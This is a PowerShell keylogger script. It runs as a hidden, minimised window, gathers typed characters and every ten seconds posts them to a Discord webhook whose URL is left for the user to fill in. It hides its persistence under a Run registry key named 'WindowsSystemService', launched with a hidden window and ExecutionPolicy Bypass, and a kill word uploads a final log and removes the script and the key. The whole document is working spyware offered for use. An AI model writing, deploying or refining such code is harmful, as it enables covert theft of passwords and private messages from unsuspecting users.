$w = "YOUR_DISCORD_WEBHOOK_URL"  # <-- Replace with your webhook
$k = "killme"
$p = "$env:APPDATA\s.ps1"
$l = ""
$t = ""

Add-Type -AssemblyName System.Windows.Forms
$form = New-Object Windows.Forms.Form
$form.KeyPreview = $true

$form.Add_KeyPress({
    $global:t += $_.KeyChar
    $global:l += $_.KeyChar

    if ($t -like "*$k") {
        $global:l += "`n[Stopped by kill word]`n"
        Invoke-RestMethod -Uri $w -Method POST -Body @{ content = $global:l }
        Remove-Item $p -Force
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemService" -ErrorAction SilentlyContinue
        $form.Close()
    }

    if ($t.Length -gt 100) { $t = $t.Substring($t.Length - 10) }
})

function Send-Log {
    if ($global:l.Length -gt 0) {
        Invoke-RestMethod -Uri $w -Method POST -Body @{ content = $global:l }
        $global:l = ""
    }
}

$timer = New-Object Windows.Forms.Timer
$timer.Interval = 10000
$timer.Add_Tick({ Send-Log })
$timer.Start()

$form.WindowState = 'Minimized'
$form.ShowInTaskbar = $false
$form.ShowIcon = $false

# Save and persist
Set-Content -Path $p -Value $MyInvocation.MyCommand.Definition -Encoding UTF8
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSystemService /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $p" /f | Out-Null

[Windows.Forms.Application]::Run($form)